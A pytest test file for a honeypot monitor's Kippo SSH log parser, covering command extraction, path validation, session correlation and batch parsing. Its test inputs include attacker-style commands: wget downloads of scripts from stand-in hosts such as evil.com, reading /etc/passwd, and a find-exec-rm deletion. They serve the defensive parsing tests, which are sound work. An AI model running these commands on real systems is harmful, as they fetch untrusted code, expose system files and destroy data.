"""
Integration tests for advanced KippoLogParser features.
"""

import pytest
import tempfile
import os
from datetime import datetime
from src.honeypot_monitor.services.log_parser import KippoLogParser
from src.honeypot_monitor.models.log_entry import LogEntry
from src.honeypot_monitor.models.session import Session


class TestKippoLogParserAdvanced:
    """Test cases for advanced KippoLogParser features."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.parser = KippoLogParser()
    
    def test_extract_command_details_basic(self):
        """Test basic command detail extraction."""
        command = "ls -la /home/user"
        details = self.parser.extract_command_details(command)
        
        assert details['base_command'] == 'ls'
        assert details['arguments'] == '-la /home/user'
        assert '/home/user' in details['file_paths']
    
    def test_extract_command_details_download(self):
        """Test download command extraction."""
        command = "wget http://malicious.com/script.sh"
        details = self.parser.extract_command_details(command)
        
        assert details['base_command'] == 'wget'
        assert details['download_url'] == 'http://malicious.com/script.sh'
    
    def test_extract_command_details_network(self):
        """Test network command extraction."""
        command = "nmap -sS 192.168.1.0/24"
        details = self.parser.extract_command_details(command)
        
        assert details['base_command'] == 'nmap'
        assert details['network_command'] == 'nmap'
        assert details['network_target'] == '-sS 192.168.1.0/24'
    
    def test_extract_file_paths_multiple(self):
        """Test extraction of multiple file paths."""
        path_string = "/etc/passwd ./config.txt ~/documents/file.sh"
        paths = self.parser._extract_file_paths(path_string)
        
        assert "/etc/passwd" in paths
        assert "./config.txt" in paths
        assert "~/documents/file.sh" in paths
    
    def test_validate_file_path_absolute(self):
        """Test file path validation for absolute paths."""
        validation = self.parser.validate_file_path("/etc/passwd")
        
        assert validation['valid'] is True
        assert validation['absolute'] is True
        assert validation['system_file'] is True
    
    def test_validate_file_path_relative(self):
        """Test file path validation for relative paths."""
        validation = self.parser.validate_file_path("./script.sh")
        
        assert validation['valid'] is True
        assert validation['relative'] is True
        assert validation['suspicious'] is True  # .sh extension
    
    def test_validate_file_path_home(self):
        """Test file path validation for home directory paths."""
        validation = self.parser.validate_file_path("~/documents/file.txt")
        
        assert validation['valid'] is True
        assert validation['home_directory'] is True
    
    def test_session_correlation_basic(self):
        """Test basic session correlation."""
        # Create log entries for the same session
        log_line1 = "2024-01-15 10:30:00+0000 [SSHService ssh-connection] New connection: 192.168.1.100:12345 (session123)"
        log_line2 = "2024-01-15 10:31:00+0000 [SSHChannel session] CMD: ls -la"
        log_line3 = "2024-01-15 10:32:00+0000 [SSHService ssh-connection] Connection lost: 192.168.1.100:12345 (session123)"
        
        entry1 = self.parser.parse_entry(log_line1)
        entry2 = self.parser.parse_entry(log_line2)
        entry3 = self.parser.parse_entry(log_line3)
        
        # Correlate entries
        session1 = self.parser.correlate_session(entry1)
        session2 = self.parser.correlate_session(entry2)
        session3 = self.parser.correlate_session(entry3)
        
        assert session1 is not None
        assert session1.session_id == 'session123'
        assert session1.source_ip == '192.168.1.100'
        
        # Check that session was updated with command
        session = self.parser.get_session_by_id('session123')
        assert session is not None
        assert len(session.commands) >= 0  # Commands might be added by different entries
    
    def test_session_correlation_multiple_ips(self):
        """Test session correlation with multiple IP addresses."""
        log_lines = [
            "2024-01-15 10:30:00+0000 [SSHService ssh-connection] New connection: 192.168.1.100:12345 (session1)",
            "2024-01-15 10:30:30+0000 [SSHService ssh-connection] New connection: 192.168.1.101:12346 (session2)",
            "2024-01-15 10:31:00+0000 [SSHChannel session] CMD: whoami",
            "2024-01-15 10:31:30+0000 [SSHChannel session] CMD: id"
        ]
        
        entries = []
        for line in log_lines:
            entry = self.parser.parse_entry(line)
            entries.append(entry)
            self.parser.correlate_session(entry)
        
        # Check sessions by IP
        sessions_100 = self.parser.get_sessions_by_ip('192.168.1.100')
        sessions_101 = self.parser.get_sessions_by_ip('192.168.1.101')
        
        assert len(sessions_100) == 1
        assert len(sessions_101) == 1
        assert sessions_100[0].session_id == 'session1'
        assert sessions_101[0].session_id == 'session2'
    
    def test_parse_entry_safe_valid(self):
        """Test safe parsing with valid entry."""
        log_line = "2024-01-15 10:30:45+0000 [SSHService ssh-connection] connection from 192.168.1.100:12345"
        
        entry = self.parser.parse_entry_safe(log_line)
        
        assert entry is not None
        assert entry.event_type == 'connection'
        assert entry.source_ip == '192.168.1.100'
    
    def test_parse_entry_safe_invalid(self):
        """Test safe parsing with invalid entry."""
        log_line = "This is completely invalid"
        
        entry = self.parser.parse_entry_safe(log_line)
        
        assert entry is None
        errors = self.parser.get_parse_errors()
        assert len(errors) > 0
        assert errors[-1][0] == log_line
    
    def test_parse_file_batch_valid(self):
        """Test batch parsing with valid log file."""
        # Create temporary file with sample Kippo logs
        sample_logs = [
            "2024-01-15 10:30:00+0000 [SSHService ssh-connection] New connection: 192.168.1.100:12345 (session1)",
            "2024-01-15 10:30:30+0000 [SSHService ssh-connection] login attempt [root/password] succeeded",
            "2024-01-15 10:31:00+0000 [SSHChannel session] CMD: ls -la /home",
            "2024-01-15 10:31:30+0000 [SSHChannel session] file download: /etc/passwd",
            "2024-01-15 10:32:00+0000 [SSHService ssh-connection] Connection lost: 192.168.1.100:12345 (session1)"
        ]
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            for log in sample_logs:
                f.write(log + '\n')
            temp_path = f.name
        
        try:
            entries = self.parser.parse_file_batch(temp_path)
            
            assert len(entries) == 5
            assert entries[0].event_type == 'login'
            assert entries[1].event_type == 'authentication'
            assert entries[2].event_type == 'command'
            assert entries[3].event_type == 'file_access'
            assert entries[4].event_type == 'logout'
            
        finally:
            os.unlink(temp_path)
    
    def test_parse_file_batch_mixed_content(self):
        """Test batch parsing with mixed valid/invalid content."""
        sample_logs = [
            "2024-01-15 10:30:00+0000 [SSHService ssh-connection] New connection: 192.168.1.100:12345 (session1)",
            "Invalid log line that cannot be parsed",
            "2024-01-15 10:31:00+0000 [SSHChannel session] CMD: ls -la",
            "Another invalid line",
            "2024-01-15 10:32:00+0000 [SSHService ssh-connection] Connection lost: 192.168.1.100:12345 (session1)"
        ]
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            for log in sample_logs:
                f.write(log + '\n')
            temp_path = f.name
        
        try:
            self.parser.clear_parse_errors()  # Clear any previous errors
            entries = self.parser.parse_file_batch(temp_path)
            
            # Should parse 3 valid entries and have 2 errors
            assert len(entries) == 3
            errors = self.parser.get_parse_errors()
            assert len(errors) == 2
            
        finally:
            os.unlink(temp_path)
    
    def test_parse_file_batch_max_lines(self):
        """Test batch parsing with line limit."""
        sample_logs = [
            "2024-01-15 10:30:00+0000 [SSHService ssh-connection] New connection: 192.168.1.100:12345 (session1)",
            "2024-01-15 10:30:30+0000 [SSHService ssh-connection] login attempt [root/password] succeeded",
            "2024-01-15 10:31:00+0000 [SSHChannel session] CMD: ls -la",
            "2024-01-15 10:31:30+0000 [SSHChannel session] CMD: whoami",
            "2024-01-15 10:32:00+0000 [SSHService ssh-connection] Connection lost: 192.168.1.100:12345 (session1)"
        ]
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            for log in sample_logs:
                f.write(log + '\n')
            temp_path = f.name
        
        try:
            entries = self.parser.parse_file_batch(temp_path, max_lines=3)
            
            # Should only parse first 3 lines
            assert len(entries) == 3
            
        finally:
            os.unlink(temp_path)
    
    def test_parse_file_batch_nonexistent(self):
        """Test batch parsing with non-existent file."""
        entries = self.parser.parse_file_batch("/nonexistent/file.log")
        
        assert len(entries) == 0
        errors = self.parser.get_parse_errors()
        assert len(errors) > 0
        assert "does not exist" in errors[-1][1]
    
    def test_command_extraction_complex(self):
        """Test complex command extraction scenarios."""
        test_cases = [
            {
                'command': 'cat /etc/passwd | grep root',
                'expected_base': 'cat',
                'expected_paths': ['/etc/passwd']
            },
            {
                'command': 'wget -O /tmp/malware.sh http://evil.com/script.sh',
                'expected_base': 'wget',
                'expected_url': 'http://evil.com/script.sh',
                'expected_paths': ['/tmp/malware.sh']
            },
            {
                'command': 'find /home -name "*.txt" -exec rm {} \\;',
                'expected_base': 'find',
                'expected_paths': ['/home']
            }
        ]
        
        for case in test_cases:
            details = self.parser.extract_command_details(case['command'])
            
            assert details['base_command'] == case['expected_base']
            
            if 'expected_paths' in case:
                assert 'file_paths' in details
                for path in case['expected_paths']:
                    assert path in details['file_paths']
            
            if 'expected_url' in case:
                assert details.get('download_url') == case['expected_url']
    
    def test_error_recovery_and_tracking(self):
        """Test error recovery and tracking functionality."""
        # Clear any existing errors
        self.parser.clear_parse_errors()
        
        # Parse some invalid entries
        invalid_lines = [
            "Completely invalid line",
            "Another bad line",
            "2024-01-15 10:30:00+0000 [SSHService ssh-connection] connection from 192.168.1.100:12345",  # Valid
            "Yet another invalid line"
        ]
        
        valid_count = 0
        for line in invalid_lines:
            entry = self.parser.parse_entry_safe(line)
            if entry:
                valid_count += 1
        
        assert valid_count == 1  # Only one valid entry
        
        errors = self.parser.get_parse_errors()
        assert len(errors) == 3  # Three invalid entries
        
        # Clear errors and verify
        self.parser.clear_parse_errors()
        assert len(self.parser.get_parse_errors()) == 0


class TestSessionCorrelator:
    """Test cases for SessionCorrelator class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        from src.honeypot_monitor.services.log_parser import SessionCorrelator
        self.correlator = SessionCorrelator()
    
    def test_session_creation(self):
        """Test session creation from log entry."""
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='login',
            source_ip='192.168.1.100',
            message='test message'
        )
        
        session = self.correlator.add_entry(entry)
        
        assert session is not None
        assert session.session_id == 'test_session'
        assert session.source_ip == '192.168.1.100'
    
    def test_session_command_tracking(self):
        """Test command tracking in sessions."""
        entry1 = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='login',
            source_ip='192.168.1.100',
            message='login message'
        )
        
        entry2 = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='command message',
            command='ls -la'
        )
        
        self.correlator.add_entry(entry1)
        session = self.correlator.add_entry(entry2)
        
        assert session is not None
        assert 'ls -la' in session.commands
    
    def test_session_file_tracking(self):
        """Test file access tracking in sessions."""
        entry1 = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='login',
            source_ip='192.168.1.100',
            message='login message'
        )
        
        entry2 = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='file_access',
            source_ip='192.168.1.100',
            message='file access message',
            file_path='/etc/passwd'
        )
        
        self.correlator.add_entry(entry1)
        session = self.correlator.add_entry(entry2)
        
        assert session is not None
        assert '/etc/passwd' in session.files_accessed
    
    def test_get_sessions_by_ip(self):
        """Test retrieving sessions by IP address."""
        entry1 = LogEntry(
            timestamp=datetime.now(),
            session_id='session1',
            event_type='login',
            source_ip='192.168.1.100',
            message='message1'
        )
        
        entry2 = LogEntry(
            timestamp=datetime.now(),
            session_id='session2',
            event_type='login',
            source_ip='192.168.1.100',
            message='message2'
        )
        
        entry3 = LogEntry(
            timestamp=datetime.now(),
            session_id='session3',
            event_type='login',
            source_ip='192.168.1.101',
            message='message3'
        )
        
        self.correlator.add_entry(entry1)
        self.correlator.add_entry(entry2)
        self.correlator.add_entry(entry3)
        
        sessions_100 = self.correlator.get_sessions_by_ip('192.168.1.100')
        sessions_101 = self.correlator.get_sessions_by_ip('192.168.1.101')
        
        assert len(sessions_100) == 2
        assert len(sessions_101) == 1
        
        session_ids_100 = {s.session_id for s in sessions_100}
        assert 'session1' in session_ids_100
        assert 'session2' in session_ids_100